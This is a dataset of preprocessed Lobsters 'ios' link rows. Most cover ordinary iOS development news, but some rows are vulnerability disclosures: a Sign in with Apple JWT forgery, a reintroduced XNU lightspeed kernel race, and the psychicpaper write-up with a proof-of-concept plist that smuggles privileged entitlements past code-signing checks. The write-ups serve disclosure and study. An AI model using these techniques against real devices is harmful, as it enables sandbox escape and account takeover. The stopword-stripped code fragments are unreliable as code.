46,Lobsters,ios,Apple iOS,Create a Tube Status home-screen Widget for iOS 14,https://medium.com/@oliverbinns/create-a-tube-status-home-screen-widget-for-ios-14-7f25f7a0a7e1,create tube status homescreen widget io,first widget create target timeline provider timeline entry widget multiple widget widget bundle providing customisation intent intent timeline provider intent configuration,first widgetcreate targetlet begin implementing widget first need create new target xcode go file new select widget extension template enter name widget uncheck include configuration intent need first basic widgetxcode created template widget u boilerplate implementation timelineprovider timelineentry widget add implementation create new source file within newly created widget foldertimeline provider timeline entrythe timeline provider work similar concept clkcomplicationdatasource used creating complication apple watch provide array data entry current time future useful apps weather app provide entry future forecast one go reducing amount refreshes needed transport status app obviously unable predict future disruption provide one entry current statusthe timelineentry status update use model shared library created struct statusupdateentry timelineprovider let date date let update linestatusupdate timelineprovider protocol requires u implement two method snapshot methodthe snapshot method called need provide shortlived display widget widget selection menu apple documentation suggests sample data used required allow snapshot return quickly possiblethe timeline methodthe timeline method called widget displayed normally homescreen device need return timeline entry transport status example able return single entry set expiry date timeline two minute future regularly refreshing widget latest uptodate informationpublic func timeline context context completion escaping timeline entry fetch latest travel information api statusservicegetstatus client networkclient update let entry simpleentry date date update update refresh data every two minute let expirydate calendar currentdate byadding minute value date date let timeline timeline entry entry policy expirydate completion timeline widgetthe widget implementation us main property wrapper new swift mark entry point widgetwe provide widgetconfiguration body widget configuration requires placeholder view displayed widget loading timeline provider discussed abovewe use modifier specify name description shown user selecting widget add homescreen also specify widget size support case tube status widget contain quite lot information add supportedfamilies systemlarge build view inside widget configuration way build windowgroup main appstruct alllineswidget widget public var body widgetconfiguration staticconfiguration kind line provider alllinesprovider placeholder alllinesplaceholderview entry contentview update entryupdates configurationdisplayname tube status description see status board underground line supportedfamilies systemlarge multiple widgetswidget bundlewe provide multiple type widget using widgetbundle protocol fairly simple use build group widget way build swiftui view mainstruct tubewidgets widgetbundle widgetbundlebuilder var body widget alllineswidget add main make sure remove widget otherwise swift compiler able work correct entrypoint appwe add many different type widget like var body widget myfirstwidget mysecondwidget mythirdwidget providing customisationintentsthe example work well want display status information line user travel one particular line could create new widget line quickly becomes messy widget selection menu would require user swipe lot line find one interested wanted also provide widget bus dlr transport mode using intent select tube linewe use intent allow user configure single widget line want see using widgetbundles keep original status widget implement additional widget using intent intenttimelineproviderlet start creating intent implemented something using siri shortcut likely already familar intentscreate new intent definition file file new file sirikit intent definition file ensure file included app target widget extensionwe create new enum datatype hold different line option create enum different tube line option using visual editorthe unknown case displayed picker use later specifying default valuenext need create new custom intent add title description user know choosingthe intent need eligible widget siri shortcut suggestion needed thiscreate custom intent allow user select line widgetwe also need declare intent application sinfoplist file otherwise able load edit widget modal key nsuseractivitytypes key array string lineselectionintent string array intent timeline providerin order support intent need conform timeline provider intenttimelineprovider rather timelineprovider protocol similar pass intent snapshot timeline methodswe use intent parameter retrieve user parameter specifiedpublic func snapshot configuration lineselectionintent context context completion escaping simpleentry let line selfline configuration statusservicegetstatus client networkclient line let entry linestatusupdateentry date date line line update update completion entry use simple line method map autogenerated intent enum line enum model func line configuration lineselectionintent line switch configurationline case circle return circle case district return district intent configurationwe set new widget intentconfiguration similar widgetconfiguration used previously requires u specify intent typestruct singlelinewidget widget public var body widgetconfiguration intentconfiguration kind single line intent lineselectionintentself provider singlelineprovider placeholder singlelineplaceholderview entry configurationdisplayname line status description see status specific london underground line supportedfamilies systemsmall systemmedium
47,Lobsters,ios,Apple iOS,WWDC 2020,https://www.apple.com/apple-events/event-stream/,wwdc,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
48,Lobsters,ios,Apple iOS,"Beyond Faster JSON Support for iOS/macOS, Part 9: CSV and SQLite",https://blog.metaobject.com/2020/06/beyond-faster-json-support-for-iosmacos.html,beyond faster json support iosmacos part csv sqlite,csv parsing gtfs h sqlite fmdb,looking mpwpliststreaming protocol using json parsing series one thing probably noticeable nt particularly jsonfocused fact nt even initially designed parsing generating could use deserialization task glad asked csv parsing one example performance book involves parsing comma separated value quickly within context getting time convert gtfs file something usable phone minute using using coredatasqlite slightly le second using custom inmemory data structure also several order magnitude faster query ondevice original project cv parser took around second nt significant part minute rest took couple hundred millisecond time make part faster well result slightly generalized mpwdelimitedtable h basic interface blockbased block called every row table called dictionary composed header row key content row value void void nsdictionary thedict int anindex block adapting mpwpliststreaming protocol straightforward void writeonbuilder id builder builder beginarray self nsdictionary thedict int anindex builder begindictionary nsstring key selfheaderkeys builder writeobject thedict key forkey key builder enddictionary builder endarray quickanddirty implementation based existing api clearly suboptimal api call first construct dictionary row header key iterate however work existing set builder nt build inmemory representation entire csv also relatively straightforward invert api usage modifying lowlevel api use mpwpliststreaming creating higherlevel block dictionaybased api top way also work mpwpliststreaming client sqlite another tabular data format sql data base macosios one common database sqlite usually accessed via coredata excellent much lightweight fmdb used fmdb bing quite delighted first impulse write mpwpliststreaming adapter looking code bit closely seemed quite bit would need mpwpliststreaming also think saw tradeoff convenient slow convenience based nsdictionary much complex potentially faster api based pulling individual type value instead decided try something ultra simple sits directly top sqlite capi implementation really quite simple compact interface mpwstreamqlite property nonatomic strong nsstring databasepath end implementation mpwstreamqlite db instancetype initwithpath nsstring newpath self super init selfdatabasepath newpath return self int exec nsstring sql re int rc db sql re autoreleasepool selfbuilder beginarray int step int re nsstring key numcols int numcols key re sqliterow step re autoreleasepool selfbuilder begindictionary int numcols const char text const char re text selfbuilder writeobject text forkey key selfbuilder enddictionary re selfbuilder endarray return rc int open return selfdatabasepath db void close db db dbnull course nt lot chiefly read update insert deletes however code striking brevity simplicity time convenient fast though still room improvement experience tend get three property time code simple convenient tends slow code convenient fast tends rather tricky code simple fast tends inconvenient use easy use following code turn table array dictionary import mpwfoundationmpwfoundationh int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwplistbuilder new db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return pretty good probably roughly par course returning generic data structure array dictionary going particularly efficient one first clue coredata predecessor eof nt particularly fast read fetching raw dictionary optimization much faster fetching object want get object instead easy replace mpwplistbuilder mpwobjectbuilder parametrized class create well define class presumably already havee task convert object class cold obviously also automated import mpwfoundationmpwfoundationh interface artist nsobject property assign long artistid property nonatomic strong nsstring name end implementation artist nsstring description return nsstring stringwithformat self class self selfartistid selfname end int main int argc char argv mpwstreamqlite db mpwstreamqlite alloc initwithpath chinookdb dbbuilder mpwobjectbuilder alloc initwithclass artist class db open db exec select artist nslog result dbbuilder result db close else nslog ca nt open database sn db error return note generate plist representation intermediate step go straight database result set object generic intermediate format mpwpliststreaming protocol dematerialized representation plist object peer
49,Lobsters,ios,Apple iOS,Translating an ARM iOS App to Intel macOS Using Bitcode,https://www.highcaffeinecontent.com/blog/20190518-Translating-an-ARM-iOS-App-to-Intel-macOS-Using-Bitcode,translating arm io app intel macos using bitcode,introduced bitcode bitcode objectivec ebcutil statically translate binary intel arm include bitcode marzipanify,apple introduced bitcode made mandatory watchos tvos kinda handwaved away question existed nebulous claim useful tuneup binary utilizing latest compiler improvement since bitcode proven instrumental seamless overnight transition watchos developer nt even need recompile apps store apple transparently could run apple watch series likely nt even notice transition taken place bitcode well bitcode small b architecturespecific intermediate representation used llvm capitalb bitcode pertains set feature allowing embed representation macho binary mechanism provide apple app store submission flexible source code far flexible built binary metadata annotation compiler practice apple easily take bitcode blob app recompile fullyfunctioning copy app going piece cake save developer recompile everfatter binary every time apple tweak arm chip bitcode longsince used apple opengl driver driver optimize fly various gpu architecture apple support seen microsoft use static recompilation great effect xbox one giving access whole library originallypowerpc xbox game without developer intervention access source code without intermediary like bitcode trivialize process course specter macos arm public psyche many year many pondered whether bitcode make transition straightforward commonly held belief bitcode suited massive architectural change like moving intel arm unconvinced decided test theory firstly need objectivec hello world app bitcode bitcode usually included building archive app store need force inclusion regular build use fembedbitcode flag custom build setting bitcodegenerationmode bitcode build binary generic io device attached device like normal bitcode nt seem embedded build ie device might want turn active architecture setting build directly using tool called ebcutil easily extract bitcode object compiled binary ebcutil e pathtomyappappmyapp bitcode object recompile intel f clang arch c xclang disablellvmpasses emitllvm x ir isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk f fo done want link compiled blob back binary clang arch isysroot applicationsxcodeappcontentsdeveloperplatformsiphonesimulatorplatformdevelopersdksiphonesimulatorsdk pathtomyappappmyapp succeeds intel version app able drop directly io simulator window install verify run important proof statically translate binary intel arm include bitcode really work gotchas morecomplex project arc appears use inline assembly mean need disable arc project translation succeed right certain kind block like completion handler also seem trip compiler instruction refuse accept see error likely issue objectivec well swift designed arc mind thus dont believe way avoid aforementioned inline assembly recompilation fail currently take step use marzipanify convert intel io app mac app run using marzipan easy mean theory apple wanted every io app app store run mac today future mechanism transparently without needing developer update recompile apps mac switched using arm chip instead intel well see apple could use bitcode translate every bitcodeenabled app mac app store without consulting developer would ready go day one kind power mean apple preannounce arm switch year ahead time also mean technology like rosetta may completely unnecessary time round obviously yet apple nt enable bitcode submission mac app store today bitcode may ideal architectural translation apple would make sure two thing change soon surely mandate bitcode marzipan apps macos
50,Lobsters,ios,Apple iOS,"Germany‚Äôs coronavirus contract tracing app is out today, and is open source",https://github.com/corona-warn-app,germany coronavirus contract tracing app today open source,grow team github sign repository issue need help issue need help package package package package used topic reload reload,dismiss grow team github github home million developer working together join grow development team manage permission collaborate project sign repository backend implementation applegoogle exposure notification api java updated aug native android app using applegoogle exposure notification api kotlin issue need help updated aug native io app using exposure notification framework apple swift issue need help updated aug html updated aug backend implementation verification process package java updated aug project overview general documentation white paper tex updated aug backend implementation test result information package java updated aug package freemarker updated jul frontend implementation verification process package java updated jul central repository collect community feature request improvement updated jul backlog item coronawarnapp updated jun coronawarnapp issue public hotline updated jun used topic perform action time signed another tab window reload refresh session signed another tab window reload refresh session
51,Lobsters,ios,Apple iOS,Zero-day in Sign in with Apple,https://bhavukjain1.github.io/blog/2020/05/30/zeroday-signin-with-apple/,zeroday sign apple,full account takeover user account technical detail email protected email protected bug,say email id need takeover account favorite website app sound scary right bug sign apple allowed month april found zeroday sign apple affected thirdparty application using implement additional security measure bug could resulted full account takeover user account third party application irrespective victim valid apple id vulnerability paid apple apple security bounty program technical detail sign apple work similarly oauth two possible way authenticate user either using jwt json web token code generated apple server code used generate jwt diagram represents jwt creation validation work step authorizing apple give option user either share apple email id party app user decides hide email id apple generates userspecific apple relay email id depending upon user selection successful authorization apple creates jwt contains email id used party app login user decoded jwt payload look like i http appleidapplecom aud comxxxxweblogin exp iat sub xxxxxxxxxxxxx chash email email protected email protected emailverified true authtime noncesupported true bug found could request jwts email id apple signature token verified using apple public key showed valid mean attacker could forge jwt linking email id gaining access victim account sample request step passing email apple generated valid jwt idtoken particular email id sample response authorization idtoken grantcode scope name email authorizeddata userid xxxxxxxxxxxx consentrequired false impact vulnerability quite critical could allowed full account takeover lot developer integrated sign apple since mandatory application support social logins name use sign apple dropbox spotify airbnb giphy acquired facebook application tested could vulnerable full account takeover security measure place verifying user apple also investigation log determined misuse account compromise due vulnerability huge thanks apple security team thanks read see next article
52,Lobsters,ios,Apple iOS,Return of the iOS sandbox escape: lightspeed's back in the race,https://www.synacktiv.com/posts/exploit/return-of-the-ios-sandbox-escape-lightspeeds-back-in-the-race.html,return io sandbox escape lightspeed back race,tl dr quick recap situation post team sparkey littlelailo tihmstar apple care mem leak blogpost poc conclusion,tl dr disclosure old new xnu kernel bug reintroduced io quick recap situation late published detail xnu kernel vulnerability dubbed lightspeed vulnerability started racy uaf syscall liolistio allows liberation kernel object twice read detail post vulnerability patched early io last vulnerable io version wondering someone would make something thrilled see team√¢ sparkey littlelailo tihmstar successful io came vulnerability died liolistio implementation correct right well really blogpost explained issue fixed memory leak introduced possible force kernel panic conclusion blogpost wondering apple would fix apple care mem leak nt know xnu developer read synacktiv blog turned bothered memory leak even opened radar issue fixed early version io fix source changed since int liolistio proct p struct liolistioargs uap int retval uap nent aioproclockspin p lckmtxconvertspin aioprocmutex p aioenqueuework p entryp io enqueuing aioprocunlock p aioproclockspin p switch uap mode case lionowait io issued must free rdar liocontext ioissued freecontext true break aioprocunlock p freecontext freeliocontext liocontext return callresult liolistio observe io issued lionowait case liocontext ioissued context freed preventing allocation remain memory also notice reworked way take proc lock bit also spot fixed wrongly reintroduced lightspeed indeed taking lock aioproclockspin p irrelevant prevent race point kernel worker may already raced main thread freed allocation see previous blogpost√¢ detail √¢ consequence exact vulnerability back primitive even test old poc√¢ may need tweak parameter test seems race probability changed bit since proc lock taken big deal conclusion doubt lightspeed fixed next io version one way fix would never free liocontext io scheduled using another variable keep trace submitted task free context none even still time blog post released think right time publish exploit moreover regression really easy spot diffing source month ago merely open secret likely researcher bad actor already knew good news vulnerability exploited webkit renderer process since sandbox considerably tightened since io introduction syscall whitelist mean risk vulnerability used malicious actor relatively low attacker would first compromise vulnerable service application order exploit vulnerability nevertheless update iphone soon patch made available apple final note would like congratulate team successful exploit
53,Lobsters,ios,Apple iOS,I had to jailbreak my iPhone to change the default browser,https://raymii.org/s/blog/I_had_to_jailbreak_my_iPhone_to_change_the_default_browser.html,jailbreak iphone change default browser,including gui application microsoft created browserchoiceeu even google like article consider sponsoring trying digital ocean vps link get credit day referral link switch default browser recently altstore packix deb github repo jailbreak apple blog browser chrome extension firefox io jailbreak safari security,title article say enough change default browser io device need jailbreak device root apple allow switch safari firefox default browser change screen requires jailbreak io device imagine ten year ago told microsoft actively develops way run linux window including gui application apple allow change default browser mobile o would told would ask smoking ten year ago microsoft created browserchoiceeu ongoing anticompetetive lawsuit regarding internet explorer default browser nowdays even google busy default browser selection apple course like article consider sponsoring trying digital ocean vps link get credit day referral link switch default browser step take change default browser recently new jailbreak io released support lastest firmware currently iphone se running jailbreak welcome addition fix small big annoyance io biggest default browser dislike safari show tab use firefox bookmark sync also use firefox extension also prohibited apple fixable jailbreak install another browser io set default mean need copy link safari switch open firefox paste link way many extra step using jaibreak device also need altstore jailbroken device need add packix repository cydia install browserdefault also manually install deb github repo code open source finally go setting open default browser switch jailbreak next switching default browser adblocking host file set better privacy le resource usage furthermore local terminal plus cc compiler icleaner pro switch unused system service like airprint chinese wifi network healthkit game center homekit save battery usage remember change root password alpine something else intend run openssh server idevice tag apple blog browser chrome extension firefox io jailbreak safari security
54,Lobsters,ios,Apple iOS,Using SQL to find my best photo of a pelican according to Apple Photos,https://simonwillison.net/2020/May/21/dogsheep-photos/,using sql find best photo pelican according apple photo,using sql find best photo pelican according apple photo try datasettejsonhtml lemur seal work dogsheepphotos aside love apple photo conspiracy theory querying apple photo sqlite database osxphotos rkperson python code le line code quality score note demo dogsheepphotosdogsheepnet issue automatic labeling photo content convolutional neural network automatically playing science communication game transfer learning fastai fascinating file work browse demo category category category category category query geography display map faceted country city stateprovince hosting serving image icloudcom content addressable storage make difficult vercel pyheif http next step import exif data get movie could really interesting image content hashing,using sql find best photo pelican according apple photo according apple photo internal sqlite database aesthetically pleasing photograph ever taken pelican sql query found best ten pelican photo select ext uuid date zoverallaestheticscore photoswithapplemetadata uuid select uuid label normalizedstring pelican order zoverallaestheticscore desc limit try extra datasettejsonhtml magic display actual photo try lemur seal actually think best pelican photo apple photo rated fifth work apple photo keep photo metadata sqlite database run machine learning model identify content every photo separate machine learning model calculate quality score photograph data life sqlite file laptop trick knowing look running query directly apple photo sqlite little hard work label metadata stored separate database file instead query run combined database created new dogsheepphotos tool aside love apple photo apple photo macos opinion apple underappreciated piece software experience people use missing valuable feature highlight show photo map io go album tab scroll half way click place wonder people miss feature macos photo library place sidebar item still baffle google photo conspiracy theory common way finding photo remember zoom area mapit run machine learning model phone laptop identify subject photo make searchable try searching dog see photo taken dog love run ondevice much le creepy uploading photo cloud order thisit really great faceted search phone app try searching dog add selfie name city see selfies taken dog place facial recognition running device use teach friend autocompleting contact little bit effort spent training see photo taken specific friend specific place specific animal apple software photo us sqlite hood underlying database undocumented clearly intended public api exists wanted gain access year querying apple photo sqlite database run apple photo mac synchronize phone via icloud photo metadata found database file life picturesphotos libraryphotoslibrarydatabasephotossqlite mine aroud photo lot detailed metadata querying database straightforward firstly almost always locked workaround create copy file secondly us custom undocumented apple sqlite extension figured way load without lot query ended throwing error osxphotos rescue ran github code search one table database searching rkperson python code delighted stumble across osxphotos project rhet turnbull well designed extremely actively maintained python tool accessing apple photo database including code handle several iteration underlying database structure thanks osxphotos first iteration code accessing apple photo metadata le line code gave location people album place human name geographical area almost free quality score apple photo fascinating database table called zcomputedassetattributes bewildering collection column one floating point number calculated presumably kind machine learning model full list one linking public photo sorted score enormously impressed result get clearly intended enduser visibility sorting might even something make sense zgenericasset table provides four score seem provide much useful result guess overall score derived zcomputedassetattributes one seen best result zoverallaestheticscore one used show best photo pelican query note demo demo running dogsheepphotosdogsheepnet currently contains photo private instance decided publish subset demo carefully filter private screenshots photo sensitive location suchlike detail demo work using dogsheepphotos createsubset command create subset database containing photo public album found issue automatic labeling photo content even impressive quality score machine learning label automatically labeling content photo surprisingly easy day thanks convolutional neural network wrote bit automatically playing science communication game transfer learning fastai apple download machine learning model device label classification quite bit hunting ended using activity monitor inspect open file port option photoanalysisd process finally figured result go picturesphotos libraryphotoslibrarydatabasesearchpsisqlite database file inspecting photoanalysisd also lead systemlibraryframeworksvisionframeworkversionsaresources folder solved another mystery apple keep model fascinating file took work figure match label corresponding photo mainly psisqlite database store photo uuids pair signed integer whereas photossqlite database store uuid string pulling label separate label table browse demo see structured label belong numeric guess mean category appears actual content water body pelican etccategory contextual entertainment trip travel museum beach activity etccategory simply month photo taken year seasoncategory original filenamecategory country photo taken query show label every category next photo geography photo taken iphone embedded latitude longitude mean display map apple also perform reversegeocoding photo resolving city region country great faceted browse photo faceted country city stateprovince hosting serving image least favourite thing apple photo hard get image onto internet enable icloud sharing image accessible given publicly accessible url embed blog entry webby thing also really want image want place control amazon ideal image storage incredibly inexpensive essentially infinite dogsheepphotos upload command take directory input scan directory image file uploads configured bucket designed work independently apple photo mainly preserve ability switch alternative image solution future using content addressable storage pattern store image filename hash file content idea since sensible photo management software leaf original file unmodified able deduplicate photo file matter store everything one bucket original image file come privacy concern embed accurate latitude longitude data exif data used reconstruct exact location history even figure address system like google photo make difficult export image location data intact addressed making content bucket private access image take place proxy server wrote deployed vercel previously zeit proxy strip exif data optionally resize image based querystring parameter also serf farfuture cache expire header mean sit vercel cdn cache rather resized every time accessed iphones default saving photo heic format fails display using img src tag browser tested proxy us pyheif convert jpegs example heic image resized proxy converted jpeg http next step project little daunting many possibility take next short term import exif data image table apple photo table give already particularly gps data want thing like iso aperture lens usedload label sqlite fulltext searchi like people able play easily getting running right fair amount think improve usability improvement better documentationthe system handle static image moment like get movie importantly live photo well longer term iphone photo location data like derive approximate latitudelongitude point dslr image matching image phone based daterunning photo computer vision system like google cloud vision apis could really interestingfor better spotting duplicate image interested exploring image content hashingthe ui right regular datasette building custom ui running datasette json api could lot fun
55,Lobsters,ios,Apple iOS,Apple to host virtual Worldwide Developers Conference beginning June 22,https://www.apple.com/newsroom/2020/05/apple-to-host-virtual-worldwide-developers-conference-beginning-june-22/,apple host virtual worldwide developer conference beginning june,apple developer app apple developer website,cupertino california apple today announced host annual worldwide developer conference virtually beginning june apple developer app apple developer website free developer company also announced swift student challenge opportunity student developer showcase love coding creating swift playground year opportunity million creative innovative developer around world get early access future io ipados macos tvos watchos learn apple engineer work build app experience enrich life apple customer around globe biggest yet bringing together global developer community million unprecedented way week june learn future apple platform said phil schiller apple senior vice president worldwide marketing wait meet online june global developer community share new tool working help create even incredible apps service look forward sharing detail everyone get closer exciting event student integral part apple developer community last year wwdc saw attendance student developer spanning different country said craig federighi apple senior vice president software engineering look forward although gathering virtual year want recognize celebrate creative contribution young developer around world wait see next generation innovative thinker turn idea reality swift student challenge swift playground revolutionary app ipad mac make learning swift programming language interactive fun pm pdt may student developer world submit swift student challenge creating interactive scene swift playground experienced within three minute winner receive exclusive jacket pin set information visit developer encouraged download apple developer app additional program information including keynote platform state union detail session lab schedule shared june information also made available apple developer website email app store country region world safest vibrant app marketplace half billion people visiting week best place user discover new apps allows developer size distribute apps customer around world app store feature many way developer build business since launch developer creating innovative apps influence culture change life apple revolutionized personal technology introduction macintosh today apple lead world innovation iphone ipad mac apple watch apple tv apple five software platform io ipados macos watchos tvos provide seamless experience across apple device empower people breakthrough service including app store apple music apple pay icloud apple employee dedicated making best product earth leaving world better found
56,Lobsters,ios,Apple iOS,psychicpaper,https://siguza.github.io/psychicpaper/,psychicpaper,psychic paper introduction poc tweeted item name background technical background full xml specification big catalogue one could find update may historical background wrote first kernel exploit bug iokituser corefoundation exploit escaping sandbox update may longer true used work like back discovered bug io changed already never bothered check mea culpa work around though get privilege complicated see explanation code update may check end update patch credited linus henze applemobilefileintegrity tweet linus conclusion file issue twitter github,siguza may psychic paper droids looking introduction yesterday apple released io beta seemingly renaming io killed one bug bug though first ever found probably also best one necessarily much give certainly much used also ridiculously simple simple fact poc tweeted look like absolute joke real dubbed psychic paper like item name doctor like carry allows get past security check make others believe wide range credential contrast virtually bug exploit one understandable without background knowledge io andor exploitation spirit also try write post manner assumes io exploitationspecific knowledge expect however loosely know xml public key encryption hash understanding c code certainly big advantage strap story boldly claim elegant exploit powerful sandbox escape io yet p background technical background first step let look sample xml file xml version encoding doctype figmentofmyimagination container meow value meow whatever container herp idk b c xyz idk basic concept tag open tag tag close stuff go stuff either raw text tag empty tag selfclosing like tag attribute like b well yada yada three thing file go beyond basic tag tag starting ending question mark socalled processing instruction treated specially doctype tag starting doctype well document type declaration treated specially well tag starting ending comment plus content ignored full xml specification contains lot irrelevant u b nobody ever forced read xml horrible parse reason xkcd illustrates beautifully yeah construct mi matched tag attribute never closed even tag never closed maybe tag like list simply end make xml format excruciatingly hard parse correctly become relevant bit building xml property list plist short yet another generalpurpose format storing serialised data array dictionary key value pair string number etc plist file exist bunch different form two realistically see apple ecosystem bplist binary format scope post xmlbased format valid xml plist look something like xml version encoding doctype plist public appledtd plist http plist version dict key o build version key string string key ioconsolelocked key false abc key ioconsoleusers key array dict key kcgssessionuseridkey key integer integer key kcgsessionlongusernamekey key string siguza string dict array def key ioregistryplanes key dict key iodevicetree key string iodevicetree string key ioservice key string ioservice string dict dict plist plist file used throughout io macos configuration file package property last least part code signature code signature binary want run io kernel extension called applemobilefileintegrity amfi requires valid code signature else killed spot code signature look like important u matter identified hashsum hash validated one two way known kernel ahead time called adhoc signature used io system apps daemon hash simply checked collection known hash directly kernel need signed valid code signing certificate used party apps scenario amfi call userland daemon amfid run necessary check code signing certificate come two form app store certificate held apple order get signed way app need pas app store review developer certificate free certificate regular developer certificate enterprise distribution certificate latter case app question also require provisioning profile file xcode party software fetch need placed appipa bundle payloadyourappembeddedmobileprovision file signed apple specifies duration list device developer account valid well restriction apply app quick look app sandboxing security boundary standard unix environment pretty much security boundary get uid check process one uid access resource another uid resource deemed privileged requires uid ie root io macos still use also introduce concept entitlement layman term entitlement list property andor privilege applied binary present embedded code signature binary form xml plist file might look like doctype plist public appledtd plist http plist version dict key taskforpidallow key true dict plist would mean binary question hold taskforpidallow entitlement specific case mean allowed use taskforpid mach trap otherwise allowed least io entitlement checked throughout io macos well upwards thousand different one existence jonathan levin built big catalogue one could find curious important thing party apps io put containerised environment access file service kernel apis possible entitlement used poke hole container remove entirely present interesting problem io system apps daemon apple one signing put entitlement want binary go app store apps apple one creating final signature developer certificate signature binary created developer apple merely sign provisioning profile mean provisioning profile must create list allowed entitlement io security model toast right away indeed run string provisioning profile find something like key entitlement key dict key keychainaccessgroups key array string yourteamid string array key gettaskallow key true key applicationidentifier key string yourteamidcomexampleapp string key comappledeveloperteamidentifier key string yourteamid string dict compared entitlement existence list extremely short two functional entitlement keychainaccessgroups related credential gettaskallow allowing app debugged whole lot work update may informed provisioning profile actually wellknown format content nicely displayed following command openssl smime verify noverify embeddedmobileprovision inform der thanks pointing adam historical background back fall wrote first kernel exploit based infamous pegasus vulnerability memory corruption xnu kernel function called osunserializebinary subordinate another function called osunserializexml two function used parse exactly xml data rather plist data way parsing plist data kernel given vulnerability written exploit still jankylooking code two function consisted january began looking hope finding memory corruption bug time process figuring build io app without xcode partly wanted understand really going hood partly hate gui development especially google something answer series click longer valid gui stuff moved somewhere else last update getting provisioning profile via xcode every day build binary app manually xcrun sdk iphoneos clang sign codesign install libimobiledevice ideviceinstaller combination well probably good portion dumb luck made discover following bug excitedly tweet thanks digging emma bug informal sense clear mean binary hold entitlement formally specify would code look like take input process handle entitlement name returned boolean saying whether process entitlement luckily u xnu precisely function iokitbsddeviokitbsdinitcpp extern c booleant iotaskhasentitlement taskt task const char entitlement osobject obj obj iouserclient copycliententitlement task entitlement obj return false obj release return obj kosbooleanfalse lion share work done two function though iokitkerneliouserclientcpp osdictionary iouserclient copycliententitlements taskt task define maxentitlementslen proct p null pidt pid sizet len void entitlementsblob null char entitlementsdata null osobject entitlementsobj null osdictionary entitlement null osstring errorstring null p proct getbsdtaskinfo task p null goto fail pid procpid p csentitlementsdictionarycopy p void entitlement entitlement return entitlement csentitlementsblobget p entitlementsblob len goto fail len offsetof csgenericblob data goto fail per rdar enforce limit amount xml try parse kernel len offsetof csgenericblob data len maxentitlementslen iolog failed parse entitlement u lu byte entitlement exceeds maximum un procbestname p pid len maxentitlementslen goto fail osunserializexml expects nulterminated string nt stored entitlement blob copy string terminate entitlementsdata char iomalloc len entitlementsdata null goto fail memcpy entitlementsdata csgenericblob entitlementsblob data len entitlementsdata len entitlementsobj osunserializexml entitlementsdata len errorstring errorstring null iolog failed parse entitlement u sn procbestname p pid errorstring getcstringnocopy goto fail entitlementsobj null goto fail entitlement osdynamiccast osdictionary entitlementsobj entitlement null goto fail entitlementsobj null fail entitlementsdata null iofree entitlementsdata len entitlementsobj null entitlementsobj release errorstring null errorstring release return entitlement osobject iouserclient copycliententitlement taskt task const char entitlement osdictionary entitlement osobject value entitlement copycliententitlements task entitlement null return null fetch entitlement value dictionary value entitlement getobject entitlement value null value retain entitlement release return value reference implementation entitlement check backed osunserializexml great interesting thing bug point particular piece code say bug reason course io one two even three plist parser least four osunserializexml kernel iocfunserialize iokituser cfpropertylistcreatewithdata corefoundation xpccreatefromplist libxpc closedsource three interesting question arise parser used parse entitlement parser amfid use parser return data answer cfpropertylistcreatewithdata folk twitter already figured tweet answer obviously lolnope hard parse xml correctly valid xml make parser return data slightly invalid xml make return slightly data word parser difference exploited make different parser see different thing heart bug making logic flaw systemspanning design flaw move exploiting would like note test osunserializexml iocfunserialize always returned data rest post consider equivalent brevity also dubbing osunserializexmliocfunserialize iokit cfpropertylistcreatewithdata cf xpccreatefromplist xpc exploit let start variant poc tweeted perhaps elegant way exploiting bug xml version encoding doctype plist public appledtd plist http plist version dict nt droids looking key platformapplication key true key comappleprivatesecuritynocontainer key true key taskforpidallow key true dict plist interesting token per understanding xml specification valid xml token nonetheless iokit cf xpc accept exactly way wrote little tool called plparse far reluctant opensource emphasis fact exist multiple plist parser io certainly work take input file combination c x args parse file cf iokit xpc engine respectively running file get plparse cix entplist taskforpidallow true platformapplication true comappleprivatesecuritynocontainer true comappleprivatesecuritynocontainer true platformapplication true taskforpidallow true output lazy jsonlike format get gist top cf followed iokit finally xpc mean slap entitlement file app plus app identifier need amfid us cf check whether entitlement provisioning profile allow see kernel daemon want check whether allowed fun see permission specific example work comment tag handling code cf relevant one anyway multiple case could comment pinfo pinfo end pinfo error cfpropertylistcreateerror kcfpropertylistreadcorrupterror cfstr encountered unexpected eof return false pinfo pinfo pinfo curr skipxmlcomment pinfo else pinfo error cfpropertylistcreateerror kcfpropertylistreadcorrupterror cfstr encountered unexpected eof return false break static void skipxmlcomment cfxmlplistparseinfo pinfo const char p pinfo curr const char end pinfo end need least character compare p end p pinfo curr return p pinfo error cfpropertylistcreateerror kcfpropertylistreadcorrupterror cfstr unterminated comment started line linenumber pinfo comment tag handling code iokit c c nextchar bool iscomment c c nextchar c iscomment isalpha c return tagbad eos c c nextchar c n state linenumber iscomment c continue c nextchar c continue c nextchar c void nextchar return tagignore iscomment break return tagbad seen iokit check char correctly advance pointer three char seeing end comment cf hand advance pointer two char par second twice thus seeing mean iokit considers start comment cf considers start end feed parser token short interpreted full comment either however difference state comment v comment cause interesting behaviour currently inside comment parser see ending comment otherwise see starting one overall mean cf see bit iokit see bit discovering bother reversing xpc simply fed test data observed result case turned see block worked perfectly case could sneak entitlement past amfid using cf show parsed iokit xpc couple variant tested varying result xml version encoding doctype plist public appledtd plist http plist version dict hurr dict plist key taskforpidallow key true dict plist xml version encoding doctype plist public appledtd plist http plist version dict key taskforpidallow key true dict plist xml version encoding doctype plist version dict key taskforpidallow key true dict plist plist version dict dict plist le elegant le rewarding first variant leave exercise reader figure parser difference cause different parser react one thing note though depending use install ipa file idevice getting entitlement survive process tricky entitlement provisioned app also contain team app identifier least cydia impactor generates randomly every time sign thus parse modify regenerate entitlement blob know alternative told xcode work fine entitlement manual variant codesignideviceinstaller certainly well escaping sandbox point forward simply matter picking entitlement start give three entitlement initial poc comappleprivatesecuritynocontainer prevents sandbox applying profile process whatsoever meaning read write location mobile user access execute ton syscalls talk many hundred driver userland service previously allowed far user data go security longer exists taskforpidallow case file system enough allows u look task port process running mobile use read write process memory directly get set thread register state platformapplication normally would marked nonapple binary allowed perform operation task port apple binary entitlement mark u genuine mintcondition cupertino cookie p update may longer true used work like back discovered bug io changed already never bothered check mea culpa work around though get privilege complicated see explanation code case though entitlement magic enough specifically want talk daemon us cf parse entitlement bit trickery gain actual legit entitlement seen parser update may previous version blog post included following snippet code method gaining legit entitlement turn longer work io totally missed nevertheless let start see would given u longer work work around though need look mach port mach message way around familiar file 